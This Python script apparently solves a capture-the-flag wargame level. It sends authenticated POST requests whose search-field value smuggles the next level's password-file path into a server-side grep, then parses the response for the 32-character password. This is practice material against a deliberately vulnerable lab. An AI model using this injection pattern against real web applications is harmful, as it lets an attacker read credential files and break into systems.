#!/usr/bin/env python3

import requests
import base64
import re
from levels_credentials import credentials, folder

level_url = credentials[9]["url"]
level_username = credentials[9]["level"]
level_password = credentials[9]["password"]

next_level_url = credentials[10]["url"]
next_level_username = credentials[10]["level"]
next_level_pass = folder + next_level_username

credentials = "%s:%s" % (level_username, level_password)
auth_creds = base64.b64encode(credentials.encode("ascii"))
heads = {"Authorization": "Basic %s" % auth_creds.decode("ascii"), "Referer": next_level_url}

alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

for letter in alphabet:
    payload =  " ".join((letter, next_level_pass, ";"))

    post_data = {"needle": payload, "submit":"Search"}
    response = requests.post(level_url, headers=heads, data=post_data)

    data = response.text
    strings = re.split('\n|:|\s|<|>', data)
    next_password = strings[strings.index("Output") + 5]

    if len(next_password) == 32:
        print(next_password)
        break
